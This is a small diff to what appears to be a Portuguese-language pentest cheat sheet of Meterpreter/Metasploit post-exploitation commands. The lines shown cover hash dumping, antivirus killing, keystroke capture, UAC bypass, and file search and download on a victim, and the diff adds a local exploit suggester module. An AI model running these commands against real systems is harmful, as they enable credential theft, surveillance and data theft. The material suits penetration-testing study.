@@ -61,7 +61,7 @@ getpid e depois migrate id_de_outro_processo_para_persisntecia
 bypass de UAC
 hashdump
 ```
-### Meterpreter
+### Meterpreter / Metasploit
 
 ```bash
 run killav
@@ -72,6 +72,7 @@ keyscan_dump
 search -d C:/Users -f .pdf
 download -r caminho
 upload arquivo caminho
+use multi/recon/local_exploit_suggester
 ```
 
 
